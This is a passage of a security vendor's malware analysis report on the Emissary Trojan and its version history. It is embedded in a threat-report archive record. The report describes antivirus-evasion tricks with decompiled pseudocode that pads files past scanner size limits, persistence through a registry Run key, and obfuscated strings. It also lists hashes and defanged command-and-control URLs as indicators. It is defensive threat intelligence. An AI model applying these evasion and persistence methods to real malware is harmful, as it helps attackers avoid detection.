375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d**\n\n**Original Name: WinDLL.dll**\n\n\n-----\n\n**encrypted form and are decrypted using an algorithm that uses addition to each byte of ciphertext,**\n**using 65 (“A”) as a key. The obfuscated strings, as seen below, involve the filename of the log file�**\n**and the command prompt executable used to create the remote shell:**\n\n\n**1**\n**2**\n\n\n**\\xEF\\xEF\\xEF\\x00\\xF6\\xF4\\xF7\\x02\\xF7\\x05\\x04\\x00\\x04\\xF4\\x05\\xED\\x13\\x0C\\x0F = 000A758C8FEAE5F.T**\n**\\x22\\x2C\\x23\\xED\\x24\\x37\\x24 = cmd.exe**\n\n\n**Date: 10/14/2015**\n\n**SHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538�**\n\n**Original Name: WinDLL.dll**\n\n**In an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled without**\n**making any changes.**\n\n#### Version 5.3\n\n**Date: 11/7/2015**\n\n**SHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051**\n\n**Original Name: WinDLL.dll**\n\n**Emissary 5.3 moved some code used to create the remote shell out of a sub-function in an attempt**\n**to evade signatures used to detect the remote shell creation. For instance, in Emissary 5.1 the**\n**command handler would call an initial subfunction that would then call a second subfunction to**\n**carry out the activities to create and interact with the remote shell. In 5.3, the command handler**\n**calls an initial subfunction that carries out the activities to create and interact with the remote shell.**\n\n#### Version 5.4\n\n**Date: 11/23/2015**\n\n**SHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037 (Base DLL**\n**with junk data removed)**\n\n**Original Name WinDLL.dll**\n\n**[Version 5.4 of Emissary was the basis for the blog “ELISE: Security Through Obesity” by Michael](http://pwc.blogs.com/cyber_security_updates/2015/12/elise-security-through-obesity.html)**\n**Yip of PWC. This blog provides a great analysis of this version of Emissary and we highly suggest**\n**reading it to become familiar with the Trojan.**\n\n**There is one difference in the functional code between Emissary versions 5.3 and 5.4, which�**\n**involves the removal of the command ‘107’ used to update the Trojan. The string ‘107’ still exists**\n**within the Trojan, however, the command handler does not check the C2 response for this**\n**command and the code used to update the Trojan has been removed.**\n\n**The major difference between Emissary version 5.4 and all previous versions is how the Trojan is�**\n**saved and loaded. First, the filenames of the various components of Emissary changed to the�**\n**following; however, the filename for debug logs has not changed:�**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n\n\n**%APPDATA%\\Programs\\Syncmgr.dll -> Loader** **Trojan**\n\n**%APPDATA%\\Programs\\60HGBC00.DAT -> Configuration** **File**\n\n**%APPDATA%\\Programs\\WEB2013BW6.DAT -> Emissary** **Trojan**\n\n**%TEMP%\\000A758C8FEAE5F.TMP -> Log file**\n\n\n-----\n\n**The reason for creating such large files is to trick antivirus applications into not scanning the file, as�**\n**it could exceed the maximum size of files the antivirus can scan (even VirusTotal has a maximum file�**\n**size of 128MB). For instance, the following pseudo code contains two loops that will end up**\n**appending 524,288,000 bytes to the end of file, resulting in a DLL that exceeds 500MB in size:�**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n\n\n**WriteFile(hFile,** **buf_EmissaryDllFromResource,** **nNumberOfBytesToWrite, &nNumberOfBytesToWrite,** **0)**\n**buf_junkData = 0;**\n**ret_time = time(0);**\n**srand(ret_time);**\n**for** **(** **i = 0;** **i < 51200; ++i** **)**\n**{**\n**for** **(** **j = 0;** **j < 640; ++j** **)**\n**{**\n**random_byte = rand() % 255;**\n**offset_in_buff_junkData = &buf_junkData + 16 * j;**\n**dword_junkData = 0x1010101 * random_byte;**\n***offset_in_buff_junkData = dword_junkData;**\n***(offset_in_buff_junkData + 1) = dword_junkData;**\n***(offset_in_buff_junkData + 2) = dword_junkData;**\n***(offset_in_buff_junkData + 3) = dword_junkData;**\n**}**\n**WriteFile(hFile, &buf_junkData,** **0x2800u, &nNumberOfBytesToWrite,** **0);**\n**}**\n\n\n**With the new filenames, malware persistence is achieved via the following registry key:�**\n\n**1** **HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Syncmgr: \"rundll32.exe \"C:\\Documents and** **Sett**\n\n\n**Date: 11/24/2015**\n\n**SHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636 (Base DLL**\n**with junk data removed)**\n\n**Original Name: WinDLL.dll**\n\n**In another attempt to avoid detection based on PE header hashes, the Trojan was recompiled**\n**without making any changes.**\n\n## Conclusion\n\n**The actors using Emissary, who were previously reported as behind Operation Lotus Blossom, have**\n**been active for at least seven years in Southeast Asia. They are persistent, evolve over time, and**\n**have enough resources to have multiple custom RATs that receive regular updates. The targeting is**\n**largely military or government, with some cases of higher education and high tech companies. They**\n**also have the ability to select and use appropriate decoys in multiple Asian languages that appear**\n**legitimate.**\n\n**The use of Emissary appears to be focused only on Taiwan and Hong Kong, with regular malware**\n**updates to avoid detection and to increase the odds of success. Of particular note, there is an**\n**interesting coincidence between the timing of the publication of our Operation Lotus Blossom report**\n**and a flurry of Emissary updates. The first occurred ten days after publication and was followed by�**\n**updates over increasingly shorter time frames, starting at roughly every three months and**\n**progressing to monthly by the final version discussed here. Until that publication, according to our�**\n**research Emissary was updated roughly every two years. This indicates the threat actors may take**\n**note of threat intelligence reporting and are fully capable of making immediate changes when**\n**deemed necessary.**\n\n**In addition to the malware evolution the actors also shifted from solely spear-phishing targets with**\n\n\n-----\n\n**future espionage related attacks.**\n\n**[We have updated the Emissary tag for Palo Alto Networks AutoFocus users to track this threat](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary)**\n**using the indicators discussed in this blog.**\n\n#### Emissary Delivery Documents\n\n**42b8898c07374b1fc6a4a33441aadf10e47f226d9d3bf3368a459c0e221dff73�**\n\n**37f752f89b0384291af23542efc08c01be962c04e3b2c881a8bc1f8771e9179f**\n\n**52b7f93bd4c2d1b1818f2a9506551852e2e7b511c9298e71edb54a39f69f94f2**\n\n**5cda2251059c34f55ac23941b56e248b9a1111e98f62c5a307eadbb9618592dd**\n\n**70097adba2743653bc73d0a2909a13f2904dbbcc1ffdb4e9013a8e61866abf5c�**\n\n**9bb0288f7b98fac909ed91ec24dad0d5a31e3eec93a1641849d9dab56c23aa59**\n\n**b201c89fd7bdfc625bacfd4850feaa81269d9b41ed10ba1f7c0cb1339f4a6abe**\n\n**ddbe42fb03bf9f4b9144396e814f13cd7054dcf238234dcb838fa9643136c03a**\n\n**e67d3cc1684c789c3bd02af7a68b783fd90dc6d2d660b174d533f4c0e07490f9**\n\n**0c550fad82f2653bc13d9629357a2a56df82602ee0ce96aa5a31f885e3aa29df**\n\n**f36b7f63f46ae6afe8882b34c1ec11597c8537a3a7fa8b6521a83308940cc77b**\n\n#### Emissary Installers/Loaders\n\n**fdcd10a2c2bf802ba5b6be55c16c0bf407bcbee902b66466b0f954d2951fad2d**\n\n**da29b647411153b49cbf4df862e3f36209eafb8ebe8b966429edec4fb15dbce9**\n\n**721676d529a0c439594502f1d53fec697adc80fa1301d2bf20c2600d99ceed4e**\n\n**0069029ee4029df88f700da335a06e0e3a534a94552fe966186166b526a20b6a**\n\n**9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab**\n\n**26e2f4f9026f19156a73ffbfde438916f24d80b8812b6cebe98167eb9be0863c�**\n\n**8e3b7dc3dca92d7458265e2bcd69caa558cbbf24bbbf1200b9aa924260c42480**\n\n**e817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b**\n\n**02831316a3a04c1248605f28fb08d810230dd4411b2a1fc8187508aea6b449c5**\n\n**675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc**\n\n**70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629**\n\n**925d2f960d8db0510f3681c038311c0c2df86c5ba03f8cb61e3c8846c31bd6e1**\n\n**98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0**\n\n**a8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8**\n\n**b07fbb92484fd2aff6d28f0ab04d5f51e96420b6d670f921b0bbe0e5392da408�**\n\n**c72b07f2a423abc4fc45dfddc5162b8eb1ea97d5b5e66811526433f09b6cdf41**\n\n**dd8ffb9f961299f7cc9cb51e17a5cccf79b7fb583e594b05ef93b54c8cad54f6�**\n\n\n-----\n\n#### Emissary DLL Version 1.0 through 5.4\n\n**a7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484**\n\n**e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30**\n\n**931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb**\n\n**5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099**\n\n**9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3**\n\n**dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3�**\n\n**5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58**\n\n**70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a**\n\n**c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634**\n\n**375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d**\n\n**e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538�**\n\n**29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051**\n\n**46ad72811990c1937d26e1f80ec1b9def8c112817f4bb9f94e3d1e4f0fb86f80**\n\n**bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636**\n\n**731cd2ce87f4c4375782de0686b5b16619f8fa2de188522cbc8e64f8851bb7ed**\n\n**acf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9**\n\n#### Emissary C2 URLs\n\n**http://101.55.121[.]79/lightserver/Default.aspx**\n**http://101.55.33[.]92/default.aspx**\n**http://101.55.33[.]92:80/default.aspx**\n**http://101.55.33[.]95:80/default.aspx**\n**http://103.243.24[.]179/Default.aspx**\n**http://118.193.221[.]233:80/default.aspx**\n**http://123.1.159[.]153/lightserver/Default.aspx**\n**http://123.1.159[.]210/lightserver/Default.aspx**\n**http://140.131.39[.]11/icanxp/help/help/default.aspx**\n**http://163.20.127[.]27/0test/test/default.aspx**\n**http://203.124.14[.]214/default.aspx**\n**http://203.124.14[.]229/default.aspx**\n**http://210.209.121[.]31/lightserver/default.aspx**\n**http://210.209.121[.]92/lightserver/Default.aspx**\n**http://210.209.121[.]92/weboffice/Default.aspx�**\n**http://appletree.onthenetas[.]com/Default.aspx**\n**http://bluefield.byinter[.]net/lightserver/Default.aspx�**\n**http://booking.passinggas[.]net/lightserver/Default.aspx**\n**http://chairman.OnTheNetAs[.]com/weboffice/Default.aspx�**\n**http://dnt5b.myfw[.]us/Default.aspx**\n**http://dnt5b.myfw[.]us/default.aspx**\n\n\n-----\n\n**http://groupspace.findhere[.]org/lightserver/Default.aspx�**\n**http://photograph.myfw[.]us/lightserver/default.aspx**\n**http://ustar5.PassAs[.]us/Default.aspx**\n**http://ustar5.PassAs[.]us/default.aspx**\n**http://webonline.OnTheNetAs[.]com/lightserver/default.aspx**\n**http://www.danangqt[.]net:80/default.aspx**\n**http://zooboo.PassingGas[.]net/weboffice/Default.aspx�**\n\n#### Emissary Campaign Codes\n\n**3test**\n**FJ201508**\n**lyk_WW**\n**A-1117a**\n**QPR-Z0330**\n**YUIO**\n**ZGP-M**\n**xman**\n**A-1117a**\n**Flash**\n**FJ20151125**\n**YUIO**\n**ll**\n**A-1231a**\n**ux-2011**\n**RT101212**\n**111**\n**UPG-ZHG-01**\n**IC00001**\n\n#### Got something to say?\n\n\n**Leave a comment...**\n\n\n**Notify me of followup comments via e-**\n**mail**\n\n\n**Name (required)**\n\n\n-----\n\n**Website**\n\n\n**SUBMIT**\n\n\n**SUBSCRIBE TO NEWSLETTERS**\n\n**Email**\n\n**COMPANY**\n\n**[Company](https://www.paloaltonetworks.com/company)**\n\n**[Careers](https://www.paloaltonetworks.com/company/careers)**\n\n**[Sitemap](https://www.paloaltonetworks.com/sitemap)**\n\n**[Report a Vulnerability](https://www.paloaltonetworks.com/security-disclosure)**\n\n**LEGAL NOTICES**\n\n**[Privacy Policy](https://www.paloaltonetworks.com/legal-notices/privacy)**\n\n**[Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)**\n\n**ACCOUNT**\n\n**[Manage Subscription](https://www.paloaltonetworks.com/company/subscriptions)**\n\n**© 2016 Palo Alto Networks, Inc. All rights reserved.**\n\n\n**Email**\n\n\n**[TAKE A TEST DRIVE](http://connect.paloaltonetworks.com/virtual-utd)**\n\n\n**SUBSCRIBE**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.10.31.Emissary_Trojan_Changelog/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve.pdf"
    ],
    "report_names": [
        "emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a1ce86c2-3efc-4115-a85e-92c5fa461838",
            "created_at": "2022-10-25T16:47:55.561071Z",
            "updated_at": "2025-03-27T02:05:17.261424Z",
            "deleted_at": null,
            "main_name": "BRONZE ELGIN",
            "aliases": [
                "Lotus Blossom ",
                "Lotus Panda ",
                "Lstudio",
                "Spring Dragon ",
                "CTG-8171 "
            ],
            "source_name": "Secureworks:BRONZE ELGIN",
            "tools": [
                " Lzari",
                "Elise"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2fa14cf4-969f-48bc-b68e-a8e7eedc6e98",
            "created_at": "2022-10-25T15:50:23.538608Z",
            "updated_at": "2025-03-27T02:00:55.495551Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "Lotus Blossom",
                "DRAGONFISH",
                "Spring Dragon",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "MITRE:Lotus Blossom",
            "tools": [
                "Elise"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "eaa8168f-3fab-4831-aa60-5956f673e6b3",
            "created_at": "2022-10-25T16:07:23.805824Z",
            "updated_at": "2025-03-27T02:02:09.986613Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "ATK 1",
                "ATK 78",
                "Billbug",
                "Bronze Elgin",
                "CTG-8171",
                "Dragonfish",
                "Lotus Blossom",
                "Operation Lotus Blossom",
                "Red Salamander",
                "Spring Dragon",
                "Thrip"
            ],
            "source_name": "ETDA:Lotus Blossom",
            "tools": [
                "BKDR_ESILE",
                "Catchamas",
                "EVILNEST",
                "Elise",
                "Group Policy Results Tool",
                "Hannotog",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "PsExec",
                "Rikamanu",
                "Sagerunex",
                "Spedear",
                "Syndicasec",
                "WMI Ghost",
                "Wimmie",
                "gpresult"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "87a20b72-ab72-402f-9013-c746c8458b0b",
            "created_at": "2023-01-06T13:46:38.293223Z",
            "updated_at": "2025-03-27T02:00:02.796483Z",
            "deleted_at": null,
            "main_name": "LOTUS PANDA",
            "aliases": [
                "Lotus BLossom",
                "Spring Dragon",
                "ST Group",
                "DRAGONFISH",
                "BRONZE ELGIN",
                "ATK1",
                "G0030",
                "Red Salamander"
            ],
            "source_name": "MISPGALAXY:LOTUS PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041628,
    "ts_creation_date": 1477936911,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/72b119031cde0a78ff6f778c6b8670f4d1f86b16.pdf",
        "text": "https://archive.orkl.eu/72b119031cde0a78ff6f778c6b8670f4d1f86b16.txt",
        "img": "https://archive.orkl.eu/72b119031cde0a78ff6f778c6b8670f4d1f86b16.jpg"
    }
}